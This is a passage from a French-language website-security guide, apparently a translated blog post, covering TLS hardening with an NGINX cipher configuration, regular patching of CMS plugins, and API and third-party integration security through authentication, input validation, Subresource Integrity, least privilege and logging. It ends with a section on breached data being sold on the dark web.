À mesure que les normes SSL/TLS évoluent, les versions plus anciennes (comme SSL 2.0 ou TLS 1.0) ne sont plus sécurisées et doivent être désactivées sur votre serveur. Au lieu de cela, imposez l'utilisation de TLS 1.2 ou supérieur.

De plus, configurez votre serveur pour ne prendre en charge que les suites de chiffrement fortes et désactivez les faibles pour prévenir les attaques de rétrogradation et de déchiffrement.

Exemple pour NGINX :

```nginx
ssl_protocols TLSv1.2 TLSv1.3;

ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:
             ECDHE-RSA-AES256-GCM-SHA384:
             ECDHE-ECDSA-CHACHA20-POLY1305:
             ECDHE-RSA-CHACHA20-POLY1305:
             ECDHE-ECDSA-AES128-GCM-SHA256:
             ECDHE-RSA-AES128-GCM-SHA256';

ssl_prefer_server_ciphers on;
```

Cette configuration impose un chiffrement moderne et sécurisé tout en désactivant les anciens algorithmes vulnérables. Après avoir appliqué ces paramètres, redémarrez votre serveur pour les appliquer.

Une fois votre configuration de suite de chiffrement en place, il est bon de la tester et d'auditer régulièrement la configuration SSL de votre serveur à l'aide d'outils comme SSL Labs pour vérifier que votre serveur ne prend en charge que des protocoles et des chiffrements sécurisés, et pour garantir la [conformité en matière de cybersécurité](https://www.timedoctor.com/blog/cybersecurity-compliance/) avec les meilleures pratiques actuelles.

## **6. Logiciels obsolètes et anciens plugins**

Le code obsolète est la fonctionnalité de sécurité préférée des pirates. Une mauvaise maintenance menace non seulement les données, mais endommage également la rétention SaaS. Lorsque les utilisateurs ne se sentent pas en sécurité, même les meilleurs outils analytiques ne peuvent pas résoudre le taux de désabonnement. Les principales plateformes CMS (comme WordPress et SquareSpace) utilisent des thèmes, des plugins et des logiciels tiers nécessitant presque des mises à jour constantes.

Sans le savoir, chacun de ceux-ci pourrait introduire des faiblesses pour le vol de données. Lorsque des mises à jour sont publiées, elles visent souvent à corriger des problèmes de sécurité, des bugs gênants et des vulnérabilités nouvellement découvertes.

### Comment corriger et mettre à jour la sécurité du site web

Les informations publiques – comme les notes officielles des logiciels sur les nouveaux correctifs de sécurité et les bugs résolus – peuvent alors servir de menu de failles pour attaquer les applications qui n'ont pas encore été mises à jour. Chaque utilisateur avec un accès obsolète représente une menace pour le système. Ne laissez pas ces problèmes être des problèmes que vos développeurs ont déjà "conçus pour éviter".

#### 1. Planifier des cycles de correctifs réguliers pour votre site, vos applications et vos services

Un site, une application ou un service doit définir des heures hebdomadaires ou mensuelles pour vérifier les numéros de version et appliquer les correctifs. Vous devez attribuer la responsabilité à un membre spécifique de l'équipe ou configurer des alertes pour rester au courant des nouveaux correctifs publiés par les fournisseurs de logiciels.

En ne appliquant pas les mises à jour rapidement, vous laissez vos systèmes exposés à des risques qui sont déjà documentés et potentiellement exploités.

#### 2. Autoriser les mises à jour automatiques partout où c'est sûr et possible

La plupart des plateformes CMS pour les sites de publication incluent l'option d'installer des mises à jour automatiques pour les fichiers principaux et les plugins.

Activer cela peut réduire considérablement la fenêtre de vulnérabilité de votre site, en particulier pour les mises à jour mineures et les correctifs de sécurité. Bien que certaines mises à jour majeures puissent encore nécessiter des tests avant la mise en œuvre, l'activation des mises à jour automatiques pour les versions de sécurité critiques garantit que votre site n'est pas laissé de côté pendant que vous attendez une intervention manuelle.

#### 3. Auditer et supprimer les logiciels, plugins et thèmes inutilisés

Les failles de sécurité les plus dangereuses sont celles qui sont oubliées, alors supprimez les thèmes ou plugins inutilisés avant qu'ils ne puissent être exploités.

Prenez l'habitude de réaliser des audits réguliers de votre système, supprimez tout ce que vous n'utilisez pas activement et remplacez les outils mal entretenus par des alternatives mieux supportées. Même les thèmes dormants ou inactifs peuvent contenir du code vulnérable qui peut être exploité s'il n'est pas nettoyé.

## **7. API, intégrations et attaques tierces**

La grande majorité des sites web dépendent des connexions API et des scripts tiers pour surveiller les analyses et traiter les paiements. Chaque connexion – peu importe sa taille – devrait s'accompagner d'un avertissement.

Comme les utilisateurs en retard pour les mises à jour, les attaquants exploitent également les API pour contourner l'authentification, utilisent des outils tiers pour extraire des données et infectent les sites partenaires avec des logiciels malveillants. Votre propre code peut être étanche, sans faille et impénétrable – mais les API et outils tiers non sécurisés partagent chacune de leurs faiblesses.

Considérez une attaque de la chaîne d'approvisionnement. Une bibliothèque JavaScript intégrée sur des milliers de sites est enveloppée avec plusieurs scripts de logiciels malveillants. Les sites qui dépendent de la bibliothèque deviennent un nouveau territoire pour les attaques, drainant les données des utilisateurs de centaines de sites qui dépendent de cette bibliothèque.

### Comment sécuriser les intégrations et les API

#### 1. Exiger une authentification forte pour toutes les requêtes d'API et d'intégration

Une application tierce, un plugin, un script externe et toute autre connexion à votre système doivent prouver leur identité avant d'accéder à vos données ou services.

Cela se fait généralement en utilisant des méthodes sécurisées comme les clés API, les jetons OAuth ou les certificats clients.

* **Clés API** : Il s'agit de jetons uniques générés par votre système et délivrés aux clients approuvés. Les clients incluent la clé dans leurs en-têtes de requête (par exemple, Authorization: Bearer VOTRE_CLE_API), et votre backend vérifie la validité de la clé avant de traiter la requête. Bien que simples à mettre en œuvre, les clés API doivent être renouvelées régulièrement et tenues confidentielles.

* **Jetons OAuth** : OAuth est idéal lorsque les utilisateurs doivent accorder un accès limité à leurs données sans partager leurs identifiants. Votre système agit comme un serveur d'autorisation et délivre des jetons d'accès temporaires. Les clients envoient ces jetons avec leurs requêtes, et votre API les valide. OAuth prend également en charge les portées et les expirations, vous offrant un contrôle d'accès granulaire.

* **Certificats clients** : Pour une sécurité plus élevée (surtout entre serveurs), utilisez le TLS mutuel (mTLS). Dans cette configuration, le client et le serveur s'authentifient mutuellement à l'aide de certificats X.509. Cela ajoute une couche de confiance solide en validant les identités par des moyens cryptographiques (surtout utile dans les intégrations bancaires ou d'entreprise).

En imposant l'authentification, vous garantissez que seuls les systèmes autorisés peuvent faire des requêtes, réduisant ainsi considérablement le risque d'accès non autorisé ou de fuites de données. Renouvelez régulièrement ces clés et surveillez leur utilisation pour détecter rapidement les comportements suspects.

#### 2. Assainir et valider toutes les données entrantes, même de tiers de confiance

C'est une erreur de supposer que les données provenant de partenaires ou de services intégrés sont automatiquement sûres. Chaque donnée que vous recevez, qu'il s'agisse d'une passerelle de paiement, d'un outil d'analyse ou d'une application marketing, doit être traitée comme potentiellement non sûre jusqu'à vérification.

Appliquez les mêmes règles de validation des entrées que vous utilisez pour les données des utilisateurs finaux : vérifiez les formats, restreignez les valeurs et échappez les entrées avant qu'elles n'interagissent avec votre système. Cela vous protège contre les attaques par injection, les données corrompues et l'utilisation abusive des API.

Pour rendre cela plus concret, voici un exemple simple de la manière dont vous pourriez valider les données entrantes avec JavaScript à partir d'une application marketing ou d'une intégration tierce :

```javascript
function validateIncomingData(data) {
  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const phonePattern = /^\+\d{1,3}\d{7,14}$/; // Format international E.164

  if (!emailPattern.test(data.email)) {
    throw new Error("Adresse email invalide");
  }

  if (!phonePattern.test(data.phone)) {
    throw new Error("Format de numéro de téléphone invalide");
  }

  if (typeof data.campaignId !== 'string' || data.campaignId.trim() === '') {
    throw new Error("ID de campagne manquant ou invalide");
  }
  return true;
}
```

Ce snippet valide une adresse email correctement formatée, un numéro de téléphone au format international et un ID de campagne non vide pour garantir la cohérence du suivi. En validant les entrées de cette manière avant qu'elles ne soient traitées ou stockées, vous réduisez le risque d'attaques par injection, de corruption de données ou d'utilisation accidentelle due à des intégrations tierces défectueuses.

#### 3. Utiliser Subresource Integrity (SRI) pour vérifier les ressources tierces

Lors de l'intégration de scripts tiers (comme les CDN pour les polices, les trackers d'analyse ou les outils de paiement), utilisez des balises SRI pour vous assurer que le code n'a pas été altéré.

SRI vous permet de définir un hachage cryptographique pour chaque fichier, et le navigateur bloquera tout fichier qui ne correspond pas à l'empreinte digitale attendue. Cela empêche les acteurs malveillants de remplacer les scripts légitimes par des scripts compromis – et cela ajoute une couche critique de confiance et de sécurité à votre architecture frontale.

Voici comment l'utiliser :

```xml
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GhOaAbfDQ4b9PrZqKmWqlL8Amoy0WyyF8JCE4"
        crossorigin="anonymous"></script>
```

* integrity : Il s'agit du hachage SRI (généralement SHA-256, SHA-384 ou SHA-512) du contenu du fichier.

* crossorigin : Requis si la ressource est hébergée sur un domaine différent. Utilisez anonymous sauf si la ressource nécessite des identifiants.

Vous pouvez générer le hachage SRI à l'aide d'outils comme [SRI Hash Generator](https://www.srihash.org/) ou des outils en ligne de commande comme openssl.

#### 4. Limiter l'accès des tiers aux seules données et fonctions dont ils ont besoin

Le simple fait qu'un service tiers ait besoin d'accéder à vos données ne signifie pas qu'il doit avoir une visibilité complète sur vos systèmes. Appliquez le principe du moindre privilège en configurant les intégrations avec des portées étroites – limitant les permissions aux seuls points de terminaison ou jeux de données nécessaires à leur fonction.

Par exemple, un outil de marketing par email n'a pas besoin d'accéder aux données de facturation, et un CRM ne doit pas toucher les paramètres du serveur backend.

#### 5. Surveiller et journaliser toutes les activités tierces

La visibilité est essentielle pour détecter les abus ou les problèmes de performance. Assurez-vous que toutes les requêtes API et les interactions tierces sont journalisées, y compris les horodatages, les points de terminaison accédés, les adresses IP et les charges utiles.

Utilisez ces données pour détecter les schémas inhabituels (comme une augmentation des requêtes échouées) et réagir rapidement aux potentielles violations. Certaines plateformes offrent également une limitation de débit pour restreindre les activités excessives ou suspectes.

Supposons que vous remarquiez une augmentation des réponses 401 (Non autorisé) provenant d'une IP spécifique sur une courte période. Vos journaux montrent des tentatives répétées d'accès à une API de traitement de paiement sans identifiants valides.

```json
{
  "timestamp": "2025-05-26T14:32:10Z",
  "endpoint": "/api/v1/payments",
  "method": "POST",
  "ip": "192.0.2.45",
  "response_code": 401
}
```

Ce que vous feriez avec ces données :

* Bloquer temporairement l'IP ou déclencher un défi CAPTCHA.

* Alerter l'équipe de sécurité ou journaliser l'incident pour une enquête plus approfondie.

* Configurer une règle pour signaler un comportement similaire à l'avenir.

* Envisager de renforcer l'authentification ou de faire tourner les clés API.

**Astuce pro :** Utilisez des outils de surveillance (comme Datadog, New Relic ou ELK Stack) avec des capacités d'alerte afin d'être averti automatiquement lorsque quelque chose de suspect se produit avant qu'il ne s'aggrave.

#### 6. Auditer régulièrement les intégrations pour les connexions obsolètes ou inutilisées

Avec le temps, votre stack peut accumuler des API inutilisées, des intégrations abandonnées ou des clés de développeur oubliées. Celles-ci peuvent devenir des passifs de sécurité si elles ne sont pas vérifiées. Passez en revue toutes les connexions tierces et supprimez tout ce qui n'est plus actif ou nécessaire.

Pour les services que vous conservez, confirmez qu'ils sont toujours maintenus, mis à jour et suivent les normes de sécurité modernes.

## **Où le Dark Web déverse vos données**

Lorsque les pirates réussissent à violer la base de données d'un site web, les conséquences s'étendent bien au-delà de l'entreprise ou de l'ensemble spécifique d'informations. Cette menace s'étend aux plateformes de commerce électronique, qui collectent souvent des données clients. C'est pourquoi suivre une [liste de contrôle de sécurité pour le commerce électronique](https://www.spocket.co/blogs/e-commerce-security-checklist) est essentiel pour protéger les informations sensibles et maintenir la confiance des clients.

Les violations de données exposent les noms d'utilisateur, les mots de passe, les détails de paiement, les adresses domiciliaires, les dates de naissance et toutes les formes de données personnelles que vous pouvez imaginer. Une fois volées, ces données ne restent souvent pas sur l'étagère : elles s'envolent du dark web, le ventre de l'internet où vos détails sont vendus, échangés et partagés parmi les cybercriminels.

À partir de là, les perceptions publiques se déchaînent contre les valeurs de la marque – et l'anxiété de chaque client concernant l'obtention d'une assurance contre le vol d'identité commence à s'amplifier. Un mot de passe réutilisé pourrait devenir la clé de Netflix, et il causera des dégâts plus importants lorsqu'il déverrouillera votre carte Discover, Morgan-Chase et vos comptes Coinbase.

Chaque détail personnel peut aider à alimenter le vol d'identité, à affiner les attaques de phishing et à conduire à la prise de contrôle du système. En tant qu'organisations, les sites font face à des poursuites judiciaires, à des amendes énormes et à la réprobation publique.

À partir de la base de données d'un seul site, les pirates peuvent piller des milliers d'emails, de mots de passe, de numéros de carte, de numéros de téléphone, d'adresses, d'images, de documents et plus encore. Ces données volées peuvent obtenir un joli prix lorsqu'elles sont vendues comme un dump de données du dark web.

## **Protégez vos données**

Aucun système ou page de connexion n'est à l'épreuve des balles, et la cybersécurité n'est jamais terminée. Les pirates utilisent tout, des emails de phishing aux scripts malveillants pour voler des données, mais chaque tactique a une défense.

Le meilleur point de départ est de suivre les meilleures pratiques – comme les mises à jour rapides, le HTTPS uniquement et les formulaires assainis. Chaque ligne de données stockée peut soudainement évoluer en une menace complexe et rampante pour les utilisateurs.

Nous devrions tous viser à sauvegarder uniquement les données les plus nécessaires, en verrouillant nos numéros de carte, mots de passe et noms d'utilisateur avec un chiffrement "slow-hash" fort.

Prévenir les dommages à notre entreprise et à nous-mêmes signifie s'engager à des pratiques en ligne prudentes tout en attendant le dernier correctif du développeur vers des pâturages en ligne plus sûrs.